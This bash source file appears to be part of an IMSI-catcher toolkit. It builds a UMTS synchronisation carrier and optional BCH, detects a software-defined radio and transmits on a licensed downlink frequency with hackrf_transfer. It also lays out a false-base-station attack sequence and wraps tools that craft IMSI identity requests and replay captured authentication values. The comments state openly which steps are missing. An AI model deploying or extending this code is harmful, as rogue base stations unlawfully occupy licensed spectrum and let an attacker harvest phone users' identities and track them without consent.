#!/usr/bin/env bash
# ── UMTS transmit and the false-base-station model ─────────────────────
# Sourced by modules/08_umts_air.sh. Kept apart for the same reason the PWS
# encoder is a file of its own: this half talks to a radio, and the decode
# half must not acquire a dependency on one.
#
# THE HONEST SHAPE OF THIS HALF. `tools/umts_phy.py` produces the two things
# a handset needs in order to see a cell at all: the primary CPICH, which it
# measures and uses for channel estimation, and the SCH, which gives it slot
# and frame synchronisation. That is a carrier a UE can synchronise to. It is
# NOT a cell it can camp on: camping needs the BCH carrying a MIB, which needs
# a full NodeB transmit chain (CRC, convolutional coding, rate matching, the
# BCH mapping), and none of that is in this tree. So `--transmit` keys a
# synchronisation carrier and says exactly that, rather than claiming a cell.

umtsa_phy() { printf '%s/tools/umts_phy.py' "$IMSISTING_ROOT"; }
umtsa_bch() { printf '%s/tools/umts_bch.py' "$IMSISTING_ROOT"; }
# The host module owns the loot directory; this file only names a file inside it.
# Falling back to UAIR_DIR keeps the two in step if the include is ever sourced
# from a module that calls it something else.
umtsa_dir() { printf '%s' "${UMTS_DIR:-${UAIR_DIR:-${LOOT_DIR:-/tmp}/umts_air}}"; }
umtsa_iq_path() { mkdir -p "$(umtsa_dir)" 2>/dev/null; printf '%s/tx_%s.cf32' "$(umtsa_dir)" "${1:-carrier}"; }

# Installed is not attached. hackrf_info ships in the same package as
# hackrf_transfer, so `command -v` passes on a machine with no radio at all.
# This probe asks the hardware and requires a positive answer.
umtsa_tx_device() {
    local out
    if command -v hackrf_info >/dev/null 2>&1; then
        out=$(timeout 15 hackrf_info 2>&1) || out=""
        if printf '%s\n' "$out" | grep -q 'Serial number' &&
           ! printf '%s\n' "$out" | grep -qiE 'no hackrf|not found|no devices|could not|failed to'; then
            printf 'hackrf\n'; return 0
        fi
    fi
    if command -v bladeRF-cli >/dev/null 2>&1; then
        out=$(timeout 15 bladeRF-cli -p 2>&1) || out=""
        printf '%s\n' "$out" | grep -qi 'backend:.*bladerf' && { printf 'bladerf\n'; return 0; }
    fi
    if command -v LimeUtil >/dev/null 2>&1; then
        out=$(timeout 15 LimeUtil --find 2>&1) || out=""
        printf '%s\n' "$out" | grep -qi 'found' && { printf 'limesdr\n'; return 0; }
    fi
    return 1
}

# umtsa_cmd_transmit [--psc n] [--rate sps] [--seconds s] [--gain db]
#                    [--freq mhz] [--no-key]
# Builds the carrier with tools/umts_phy.py and, if a radio answers, keys it
# with hackrf_transfer. With no radio it writes the file, prints the exact
# command it would have run, and exits 3: nothing was transmitted.
umtsa_cmd_transmit() {
    local psc="0" rate="7680000" secs="1.0" gain="0" freq="" key="yes" bch=""
    # A bare number is the carrier in MHz. A form row should be able to ask for
    # one value without the operator having to spell a flag to give it.
    if (( $# > 0 )) && [[ "${1:-}" =~ ^[0-9]+$ ]]; then
        freq="$1"; shift
    fi
    while (( $# )); do
        case "$1" in
            --psc)      psc="${2:-}"; shift 2 ;;
            --rate)     rate="${2:-}"; shift 2 ;;
            --seconds)  secs="${2:-}"; shift 2 ;;
            --gain)     gain="${2:-}"; shift 2 ;;
            --freq)     freq="${2:-}"; shift 2 ;;
            --bch-hex)  bch="${2:-}"; shift 2 ;;
            --no-key)   key="no"; shift ;;
            *)  printf 'ERROR\t--transmit does not take %s\n' "$(umtsa_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    [[ "$psc" =~ ^[0-9]+$ ]] && (( psc >= 0 && psc <= 511 )) || {
        printf 'ERROR\t--psc must be 0..511, got %s\n' "$(umtsa_sanitize "$psc")" >&2; return 2; }
    [[ "$rate" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--rate must be an integer sample rate, got %s\n' "$(umtsa_sanitize "$rate")" >&2; return 2; }
    [[ "$freq" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--transmit needs --freq <MHz> for the carrier\n' >&2
        printf 'WHY\ta UMTS downlink is a licensed band; the carrier has to be named rather than defaulted\n' >&2
        return 2; }
    # The MIB is 24 bits, so the argument is six hex digits. Refusing here rather
    # than in the chain tool keeps the exit code honest: a malformed argument is
    # a usage error (2), not an I/O failure (1).
    if [[ -n "$bch" && ! "$bch" =~ ^[0-9a-fA-F]{6}$ ]]; then
        printf 'ERROR\t--bch-hex takes the 24-bit MIB as six hex digits, got %s\n' "$(umtsa_sanitize "$bch")" >&2
        printf 'WHY\tthe BCH transport block is 24 bits (TS 25.331 8.1.1 MIB, TS 25.212 4.2.13.6 one TB per TTI); a shorter argument is not a MIB and a longer one is not one either\n' >&2
        return 2
    fi
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is needed to build the carrier\n' >&2; return 1; }

    local iq gen
    iq=$(umtsa_iq_path carrier)
    if ! gen=$(timeout 300 python3 "$(umtsa_phy)" gen --carrier both --out "$iq" \
                 --format cf32 --rate "$rate" --seconds "$secs" --psc "$psc" 2>&1); then
        printf 'ERROR\tthe carrier could not be built\n' >&2
        printf '%s\n' "$gen" | sed 's/^/  /' >&2
        return 1
    fi

    printf 'carrier\t%s\n' "$iq"
    printf 'carrier_format\tcf32\n'
    printf 'carrier_rate\t%s\n' "$rate"
    printf 'carrier_psc\t%s\n' "$psc"
    printf 'carrier_seconds\t%s\n' "$secs"
    printf 'carrier_components\tP-CPICH (SF 256, code 0, primary scrambling) + P-SCH + S-SCH\n'
    printf 'carrier_ref\tTS 25.213 5.2 (scrambling), TS 25.211 5.3.3 (SCH)\n'

    # The BCH is what turns a carrier a handset can see into a cell it can read.
    # It is a separate tool because it is a separate chain (CRC, convolutional
    # coding, rate matching, P-CCPCH), and because that chain has no external
    # decoder to referee it: its proof lives in tools/check-umts-bch.sh.
    if [[ -n "$bch" ]]; then
        if ! command -v python3 >/dev/null 2>&1 || [[ ! -f "$(umtsa_bch)" ]]; then
            printf 'ERROR\tthe BCH chain tool is not present, so --bch-hex cannot be honoured\n' >&2
            printf 'WHY\ttools/umts_bch.py carries the TS 25.212 chain; without it the carrier has no broadcast channel\n' >&2
            return 1
        fi
        local bchout
        if ! bchout=$(timeout 300 python3 "$(umtsa_bch)" encode --bch-hex "$bch" \
                        --out "$(umtsa_iq_path bch)" --format cf32 --rate "$rate" \
                        --psc "$psc" --frames 1 2>&1); then
            printf 'ERROR\tthe BCH chain refused these bits\n' >&2
            printf '%s\n' "$bchout" | sed 's/^/  /' >&2
            return 1
        fi
        printf 'carrier_components\t+ P-CCPCH carrying the BCH (TS 25.212 4.6 chain)\n'
        printf 'bch_hex\t%s\n' "$(umtsa_sanitize "$bch")"
        printf 'bch_file\t%s\n' "$(umtsa_iq_path bch)"
        printf 'carrier_is_a_cell\tpartly -- the MIB is on the BCH, so a UE can read the system frame number; camping also needs the SIBs scheduled on the FACH, and this tree forges those octets without a transport to carry them\n'
    else
        printf 'carrier_is_a_cell\tno -- no BCH, so a UE can synchronise to this carrier and cannot read a MIB from it; add --bch-hex with the 24-bit MIB to carry one\n'
    fi

    local dev
    if [[ "$key" == "no" ]] || ! dev=$(umtsa_tx_device 2>/dev/null); then
        printf 'sdr\tnone\n'
        printf 'sdr_probe\tno radio answered (hackrf_info, bladeRF-cli -p, LimeUtil --find)\n'
        printf 'sdr_call\thackrf_transfer -t %s -f %s000000 -s %s -a 1 -x %s\n' \
               "$iq" "$freq" "$rate" "$gain"
        printf 'sent\t0\n'
        printf 'status\thandoff\n'
        printf 'handoff\ttake carrier to a transmitter and name the frequency: this module built the samples, it did not key anything\n'
        return 3
    fi

    printf 'sdr\t%s\n' "$dev"
    case "$dev" in
        hackrf)
            local lout lrc
            lout=$(timeout 120 hackrf_transfer -t "$iq" -f "$(( freq * 1000000 ))" \
                       -s "$rate" -a 1 -x "$gain" 2>&1); lrc=$?
            if (( lrc != 0 )); then
                printf 'ERROR\thackrf_transfer exited %d\n' "$lrc" >&2
                printf '%s\n' "$lout" | sed 's/^/\t/' >&2
                return 1
            fi
            printf 'sent\t%s\n' "$(( freq * 1000000 ))"
            printf 'status\tkeyed\n' ;;
        *)
            printf 'sdr_call\thackrf_transfer -t %s -f %s000000 -s %s -a 1 -x %s\n' \
                   "$iq" "$freq" "$rate" "$gain"
            printf 'sent\t0\n'
            printf 'status\thandoff\n'
            printf 'handoff\t%s is attached but only the hackrf call is built here; run the printed command or supply the equivalent\n' "$dev"
            return 3 ;;
    esac
    return 0
}

# umtsa_cmd_catcher_model — the sequence a false base station runs, stated as
# the tree can and cannot do it. This is not a claim that the attack works from
# this repository; it is the map of which step exists and which does not, so
# nobody has to infer it from a missing verb.
umtsa_cmd_catcher_model() {
    printf 'step\twhat happens\tclause\tin_this_tree\n'
    printf '1\tthe handset searches the downlink rasters, finds a carrier and synchronises to it on the SCH\tTS 25.214 4.3\tbuilt: --transmit builds CPICH + SCH\n'
    printf '2\tthe handset reads the MIB on the BCH to learn the system frame number and the SIB scheduling\tTS 25.212 4.2\tbuilt: tools/umts_bch.py carries the whole chain and modules/08_umts_air.sh --transmit puts it on the P-CCPCH, so --bch-hex keys a real MIB\n'
    printf '3\tthe handset reads SIB1/SIB3/SIB5 for PLMN, cell identity, location area and reselection\tTS 25.331 8.1.1\tpartial: --decode-sib reads them and --transmit carries a BCH, but no verb packs a SIB onto that transport; the MIB says where the SIBs would be and nothing fills them\n'
    printf '4\tthe handset sends RRC CONNECTION REQUEST naming its initial UE identity (TMSI or IMSI)\tTS 25.331 8.1.3\tparse: --parse-rrc classifies it\n'
    printf '5\tthe network answers RRC CONNECTION SETUP\tTS 25.331 8.1.3\tbuilt: --build-rrc-setup\n'
    printf '6\tthe CN sends a NAS IDENTITY REQUEST (MM), which asks for the IMSI in the clear\tTS 24.008 9.2.5, TS 25.331 10.2\tbuilt: --catcher-identity writes the four MM octets and wraps them in a DL DIRECT TRANSFER (the MM part is byte-exact; the RRC wrapper is derived from the ASN.1 and has no referee on this machine, which the verb says in its own output)\n'
    printf '7\tthe handset is authenticated by the network before it will answer anything else\tTS 33.102 6.3\tbuilt as a replay only: --catcher-auth re-sends a RAND and AUTN seen once on the real network, which is what a catcher actually does; computing a fresh AUTN needs K, which no passive capture yields\n'
    printf '8\tthe network releases the connection so the handset returns to idle and repeats\tTS 25.331 8.1.4\tbuilt: --build-rrc-reject carries the wait time\n'
    printf 'verdict\tsteps 1 and 4-8 exist in this tree as samples and octets; steps 2-3 are the transport gap, and step 7 is why a catcher built from only these pieces does not work against a handset with a cached AKA context\n'
    return 0
}

# Strip tabs and newlines: every argument this file echoes goes through here.
umtsa_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }

# The identity request and the authentication replay. Both are pure message
# construction: they write octets and nothing leaves the machine. The identity
# request is the message a catcher exists to send; the auth replay is how it
# gets past a handset that will not answer an unauthenticated network.
umtsa_catcher_tool() { printf '%s/tools/umts_catcher.py' "$IMSISTING_ROOT"; }

umtsa_cmd_identity_request() {
    local identity="imsi" txid="0" domain="cs" bare=""
    while (( $# )); do
        case "$1" in
            --identity) identity="${2:-}"; shift 2 ;;
            --txid)     txid="${2:-}"; shift 2 ;;
            --domain)   domain="${2:-}"; shift 2 ;;
            --bare)     bare="--bare"; shift ;;
            *) printf 'ERROR\t--catcher-identity does not take %s\n' "$(umtsa_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is needed to build the message\n' >&2; return 1; }
    timeout 60 python3 "$(umtsa_catcher_tool)" identity \
        --identity "$identity" --txid "$txid" --domain "$domain" $bare || return $?
}

umtsa_cmd_auth_replay() {
    local rand="" autn=""
    # Two bare hex values are RAND then AUTN: a form row asks for the pair, and
    # a form row should not have to spell a flag to give it.
    if (( $# >= 2 )) && [[ "${1:-}" =~ ^[0-9a-fA-F]{32}$ ]] && [[ "${2:-}" =~ ^[0-9a-fA-F]{32}$ ]]; then
        rand="$1"; autn="$2"; shift 2
    fi
    while (( $# )); do
        case "$1" in
            --rand) rand="${2:-}"; shift 2 ;;
            --autn) autn="${2:-}"; shift 2 ;;
            *) printf 'ERROR\t--catcher-auth does not take %s\n' "$(umtsa_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    if [[ -z "$rand" || -z "$autn" ]]; then
        printf 'ERROR\t--catcher-auth needs --rand <32 hex> and --autn <32 hex>\n' >&2
        printf 'WHY\tthey are the two values a real AUTHENTICATION REQUEST carried; without both there is nothing to replay, and this tool holds no key to make new ones\n' >&2
        return 2
    fi
    timeout 60 python3 "$(umtsa_catcher_tool)" auth --rand "$rand" --autn "$autn" || return $?
}
